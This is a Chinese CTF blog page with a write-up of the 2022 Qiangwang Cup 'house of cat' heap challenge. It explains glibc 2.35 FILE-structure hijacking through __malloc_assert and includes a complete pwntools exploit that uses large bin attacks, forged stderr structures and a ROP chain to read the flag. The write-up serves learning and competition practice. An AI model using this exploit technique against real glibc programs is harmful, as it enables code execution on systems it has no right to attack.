<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"zikh26.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="万古凡间一过客，九天之上第一仙">
<meta property="og:type" content="website">
<meta property="og:title" content="ZIKH26&#39;s Blog">
<meta property="og:url" content="https://zikh26.github.io/page/2/index.html">
<meta property="og:site_name" content="ZIKH26&#39;s Blog">
<meta property="og:description" content="万古凡间一过客，九天之上第一仙">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="ZIKH26">
<meta property="article:tag" content="CTF PWN IT">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://zikh26.github.io/page/2/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"page/2/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>ZIKH26's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">ZIKH26's Blog</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
    </div>
  </div>
</div>







</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">ZIKH26</p>
  <div class="site-description" itemprop="description">万古凡间一过客，九天之上第一仙</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">98</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">11</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">100</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/7de5a5b7.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/7de5a5b7.html" class="post-title-link" itemprop="url">house of cat -2022强网杯pwn复现</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：09:22:29" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">学习总结</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/%E8%B5%9B%E9%A2%98WP/" itemprop="url" rel="index"><span itemprop="name">赛题WP</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>前几天进行了 <code>house of apple</code> 的学习，而 <code>house of appl2</code> 和 <code>house of cat</code> 利用的大致思想是一样的（都是通过 <code>wide_data-&gt;wide_vtable</code> 中的函数指针进行的跳转），因此来复现一下去年强网杯的这道 <code>house of cat</code></p>
<p>本题我感觉也比较有代表性，因为在 <code>house of apple</code> 的那篇文章中的例题最后触发攻击是在 <code>exit</code> 函数，但是如果题目中无法从 <code>main</code> 函数返回也没有 <code>exit</code> 函数，那就需要通过 <code>malloc_assert</code> 来触发最后的攻击，而本题就是通过这样的方式触发的攻击。</p>
<h3 id="如何通过-malloc-assert-触发攻击"><a href="#如何通过-malloc-assert-触发攻击" class="headerlink" title="如何通过 malloc_assert 触发攻击"></a>如何通过 <code>malloc_assert</code> 触发攻击</h3><p><code>__malloc_assert</code> 函数会在内存分配处理之前检查请求是否合法，如果检测到不合法的请求就会触发断言并终止程序，触发这个 <code>__malloc_assert</code> 函数有很多处，<strong>通常我们选择将 <code>top chunk</code> 的 <code>size</code>  改成非法（在 <code>sysmalloc</code> 函数中有针对这里的检查），这样再次申请堆块的时候就会触发 <code>__malloc_assert</code></strong></p>
<p><code>__malloc_assert</code> 在 <code>2.35</code> 的 <code>glibc</code> 中源码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">		 <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">		     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     file, line,</span><br><span class="line">		     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     assertion);</span><br><span class="line">  fflush (<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里有这样一条执行链 <code>__malloc_assert-&gt; __fxprintf-&gt;__vfxprintf-&gt;locked_vfxprintf-&gt;__vfprintf_internal-&gt;_IO_file_xsputn</code></p>
<p>最后触发的 <code>_IO_file_xsputn</code> 是通过 <code>vtable</code> 中的函数指针来触发的，我们想要去劫持的话，首先将 <code>_IO_2_1_stderr</code> 结构体中的 <code>vtable</code> 改成 <code>_IO_wfile_jumps+0x10</code> 的地址（加 <code>0x10</code> 的原因是 <code>_IO_file_xsputn</code> 的地址在 <code>_IO_file_jumps</code> 中比 <code>IO_file_seekoff</code> 的地址低 <code>0x10</code> 个字节），这样原本跳转执行 <code>_IO_file_xsputn</code> 时，实际上执行的是 <code>_IO_wfile_seekoff</code> 如下图</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302040938184.png" alt="image-20230204093820778"></p>
<p><code>_IO_wfile_seekoff</code> 函数源码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> do_ftell_wide (fp);</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">		       &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">		      || _IO_in_put_mode (fp));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们执行 <code>_IO_wfile_seekoff</code> 函数的目的就是为了触发 <code>_IO_switch_to_wget_mode</code> 函数</p>
<p><code>_IO_switch_to_wget_mode</code> 函数源码如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行 <code>_IO_switch_to_wget_mode</code> 函数的目的就是为了触发 <code>_IO_WOVERFLOW</code> ,因为这个 <code>_IO_WOVERFLOW</code> 函数是通过 <code>_wide_data-&gt;_wide_vtable</code> 中所存放的函数指针进行跳转的， <code>_wide_vtable</code> 是我们可控的，从而在这里可以劫持程序的执行流。</p>
<p>想触发最后的 <code>_IO_WOVERFLOW</code> ，需要满足 <code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code> 这个条件。</p>
<p>之所以先提上面的部分是因为本题接下来用的手法只有上面部分是 <code>house of apple2</code>  中没有提到的，其余部分都和 <code>house of apple2</code> 中的利用思路相似，就不再详细说明。</p>
<h3 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h3><p>附件：</p>
<p>链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1BSiI9TmmU7uqMr7Ou3bIxQ?pwd=ccp4">https://pan.baidu.com/s/1BSiI9TmmU7uqMr7Ou3bIxQ?pwd=ccp4</a> 提取码: ccp4 </p>
<h4 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略"></a>保护策略</h4><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041006987.png" alt="image-20230204100619768" style="zoom: 67%;" />

<p>保护拉满，沙箱是白名单只能打 <code>orw</code> ，需要注意一下 <code>read</code> 的第一个参数只能设置为 <code>0</code> ，所以最后打 <code>orw</code> 之前需要先 <code>close(0)</code></p>
<h4 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h4><p>程序是一个菜单的堆题，不过在使用程序的主要功能之前，需要输入一些数据来绕过这个检查，可能自己的逆向能力还得提高吧，反正这里的检查我是搞了好久，结论就是最开始输入 <code>LOGIN | r00t QWB QWXFadmin</code> 去进行登录，接下来每一次调用具体功能之前都要发送一句 <code>CAT | r00t QWB QWXF$\xff</code> ,接下来才能去执行正常的功能。</p>
<p>功能一共有四个 <code>add</code> <code>edit</code> <code>show</code> <code>delete</code> </p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041015973.png" alt="image-20230204101548907" style="zoom:50%;" />

<p><code>edit</code> 函数只能使用两次，并且只能写入 <code>0x30</code> 字节的数据</p>
<p><code>delete</code> 函数存在 <code>UAF</code> 漏洞</p>
<p><code>add</code> 函数申请的堆块大小的范围是 <code>0x418~0x46f</code> ，申请完堆块后可以向里面写入 <code>size</code> 字节的数据</p>
<p><code>show</code> 函数只能泄露 <code>0x30</code> 字节的数据</p>
<h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><ol>
<li>泄露 <code>libc</code> 地址和堆地址</li>
<li>利用 <code>edit</code> 函数完成第一次 <code>large bin attack</code> 向 <code>libc</code> 中的全局变量 <code>stderr</code> 写入一个堆地址，从而控制 <code>_IO_2_1_stderr</code> 结构体的各个字段</li>
<li>第二次 <code>large bin attack</code> 去篡改 <code>top chunk</code> 的 <code>size</code> 将其改为非法（要往小了改，因为只有 <code>top chunk</code> 无法满足要申请的 <code>size </code> 时，才会触发 <code>sysmalloc</code>） <strong>注意 <code>large bin attack</code> 想将 <code>top chunk</code> 的 <code>size</code> 改小的话，需要地址错位</strong></li>
<li>申请一个堆块，此时执行 <code>__malloc_assert</code> 触发攻击</li>
</ol>
<p>思路不难，难点在于整体的一个堆风水和结构体布局需要慢慢调试，因为文章开头已经说明了如何通过 <code>__malloc_assert</code> 触发攻击，剩下的就是先劫持 <code>_IO_2_1_stderr</code> 结构体，将其的 <code>vtable</code> 字段改为 <code>_IO_wfile_jumps+0x10</code>  地址，然后 <code>_wide_data-&gt;vtable</code> 改为可控堆地址，使其执行 <code>_IO_WOVERFLOW</code> 的时候，可以进行劫持执行流（这里只说明了<strong>部分篡改</strong>的字段）</p>
<p>然后依然是 <a href="https://zikh26.github.io/posts/19609dd.html">house of apple2</a> 这篇文章的例题中提到的用 <code>magic_gadget</code> 进行一个栈迁移（如果需要看具体的细节请参考 <code>house of apple</code> 这篇文章），然后彻底控制程序的执行流，去打 <code>rop</code> 链，执行 <code>close</code> <code>open</code> <code>read</code> <code>write</code> 函数</p>
<p>最后我出示一下伪造的两个结构体</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041045993.png" alt="image-20230204104522759" style="zoom:50%;" />





<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041048906.png" alt="image-20230204104823695" style="zoom:50%;" />

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041048822.png" alt="image-20230204104835594" style="zoom:50%;" />



<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><p><a href="https://zikh26.github.io/posts/ad411136.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;LOGIN | r00t QWB QWXFadmin&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;mew mew mew~~~~~~\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendafter(<span class="string">&quot;mew mew mew~~~~~~\n&quot;</span>,<span class="string">&#x27;CAT | r00t QWB QWXF$\xff&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your cat choice:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your cat idx:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your cat size:\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your content:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendafter(<span class="string">&quot;mew mew mew~~~~~~\n&quot;</span>,<span class="string">&#x27;CAT | r00t QWB QWXF$\xff&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your cat choice:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your cat idx:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendafter(<span class="string">&quot;mew mew mew~~~~~~\n&quot;</span>,<span class="string">&#x27;CAT | r00t QWB QWXF$\xff&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your cat choice:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your cat idx:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendafter(<span class="string">&quot;mew mew mew~~~~~~\n&quot;</span>,<span class="string">&#x27;CAT | r00t QWB QWXF$\xff&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your cat choice:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your cat idx:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;plz input your content:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xe</span>,<span class="number">0x450</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0xd</span>,<span class="number">0x450</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">0xe</span>)</span><br><span class="line">add(<span class="number">0xc</span>,<span class="number">0x460</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">show(<span class="number">0xe</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Context:\n&#x27;</span>)</span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x21a0e0</span></span><br><span class="line">p.recv(<span class="number">2</span>)</span><br><span class="line">heap_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x290</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">IO_list_all=libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">magic_gadget=libc_base+<span class="number">0x16a1fa</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;svcudp_reply+26&gt;:    mov    rbp,QWORD PTR [rdi+0x48]</span></span><br><span class="line"><span class="string">&lt;svcudp_reply+30&gt;:    mov    rax,QWORD PTR [rbp+0x18]</span></span><br><span class="line"><span class="string">&lt;svcudp_reply+34&gt;:    lea    r13,[rbp+0x10]</span></span><br><span class="line"><span class="string">&lt;svcudp_reply+38&gt;:    mov    DWORD PTR [rbp+0x10],0x0</span></span><br><span class="line"><span class="string">&lt;svcudp_reply+45&gt;:    mov    rdi,r13</span></span><br><span class="line"><span class="string">&lt;svcudp_reply+48&gt;:    call   QWORD PTR [rax+0x28]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">leave_ret=libc_base+<span class="number">0x00000000000562ec</span></span><br><span class="line">add_rsp_ret=libc_base+<span class="number">0x000000000003a889</span></span><br><span class="line">stderr_ptr=<span class="number">0x21a860</span>+libc_base</span><br><span class="line">lock=libc_base+<span class="number">0x21ba60</span></span><br><span class="line">pop_rdi=libc_base+<span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rsi=libc_base+<span class="number">0x000000000002be51</span></span><br><span class="line">pop_rdx_r12=libc_base+<span class="number">0x000000000011f497</span></span><br><span class="line">pop_rax_ret=libc_base+<span class="number">0x0000000000045eb0</span></span><br><span class="line">syscall=libc_base+<span class="number">0xea5b9</span></span><br><span class="line">read_addr=libc_base+libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr=libc_base+libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">close_addr=libc_base+libc.symbols[<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xb</span>,<span class="number">0x450</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#close</span></span><br><span class="line">rop=p64(pop_rdi)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(close_addr)</span><br><span class="line"><span class="comment">#open</span></span><br><span class="line">rop+=p64(pop_rdi)</span><br><span class="line">rop+=p64(heap_base+<span class="number">0x1168</span>)<span class="comment"># &#x27;flag&#x27; address</span></span><br><span class="line">rop+=p64(pop_rsi)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(pop_rax_ret)</span><br><span class="line">rop+=p64(<span class="number">2</span>)</span><br><span class="line">rop+=p64(syscall)</span><br><span class="line"></span><br><span class="line"><span class="comment">#read</span></span><br><span class="line">rop+=p64(pop_rdi)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(pop_rsi)</span><br><span class="line">rop+=p64(heap_base+<span class="number">0xb40</span>)<span class="comment"># flag store address</span></span><br><span class="line">rop+=p64(pop_rdx_r12)</span><br><span class="line">rop+=p64(<span class="number">0x50</span>)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(read_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write</span></span><br><span class="line">rop+=p64(pop_rdi)</span><br><span class="line">rop+=p64(<span class="number">1</span>)</span><br><span class="line">rop+=p64(pop_rsi)</span><br><span class="line">rop+=p64(heap_base+<span class="number">0xb40</span>)<span class="comment"># flag store address</span></span><br><span class="line">rop+=p64(pop_rdx_r12)</span><br><span class="line">rop+=p64(<span class="number">0x50</span>)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(write_addr)</span><br><span class="line"></span><br><span class="line">wide_data=p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">1</span>)</span><br><span class="line">wide_data+=p64(<span class="number">0</span>)*<span class="number">20</span></span><br><span class="line">wide_data+=<span class="string">b&quot;flag\x00\x00\x00\x00&quot;</span></span><br><span class="line">wide_data+=p64(<span class="number">0</span>)</span><br><span class="line">wide_data+=p64(<span class="number">0</span>)</span><br><span class="line">wide_data+=p64(heap_base+<span class="number">0x1170</span>)<span class="comment">#wide_vtable</span></span><br><span class="line">wide_data+=p64(magic_gadget)<span class="comment">#first call</span></span><br><span class="line">wide_data+=p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">wide_data+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">wide_data+=p64(add_rsp_ret)</span><br><span class="line">wide_data+=p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">wide_data+=p64(<span class="number">0x1178</span>+<span class="number">0x30</span>+heap_base)<span class="comment">#second call</span></span><br><span class="line">wide_data+=p64(leave_ret)</span><br><span class="line">wide_data+=rop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io_file=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">io_file+=p64(heap_base+<span class="number">0x1180</span>+<span class="number">0x30</span>)<span class="comment">#  rbp   io_save_base</span></span><br><span class="line">io_file+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">io_file+=p64(lock)+p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">io_file+=p64(heap_base+<span class="number">0x10a0</span>)<span class="comment">#wide_data</span></span><br><span class="line">io_file+=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">io_file+=p64(libc_base+<span class="number">0x2160c0</span>+<span class="number">0x10</span>)<span class="comment">#vtable</span></span><br><span class="line">io_file+=wide_data</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x428</span>,io_file)<span class="comment">#0xwfile 2160c0</span></span><br><span class="line">add(<span class="number">0xf</span>,<span class="number">0x460</span>,<span class="string">&#x27;prevent merge chunk&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x418</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x460</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+<span class="number">0x21a0d0</span>)*<span class="number">2</span>+p64(IO_list_all)+p64(stderr_ptr-<span class="number">0x20</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x440</span>,<span class="string">&#x27;large bin attack chunk&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x418</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#second large bin attack</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x460</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x430</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x460</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,p64(heap_base+<span class="number">0x2e20</span>)+p64(<span class="number">0x21a0e0</span>+libc_base)+p64(heap_base+<span class="number">0x2e20</span>)+p64(<span class="number">0x3265</span>-<span class="number">2</span>+heap_base-<span class="number">0x20</span>))</span><br><span class="line">  </span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0xe</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x1F04</span>,<span class="number">0x1F10</span>,<span class="number">0x1EF8</span>,<span class="number">0x1EEC</span>,<span class="number">0x177F</span>) </span><br><span class="line">add(<span class="number">0xa</span>,<span class="number">0x450</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x46f</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;mew mew mew~~~~~~\n&quot;</span>,<span class="string">&#x27;CAT | r00t QWB QWXF$\xff&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;plz input your cat choice:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;plz input your cat idx:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;plz input your cat size:\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0x46f</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302041055201.png" alt="image-20230204105543745"></p>
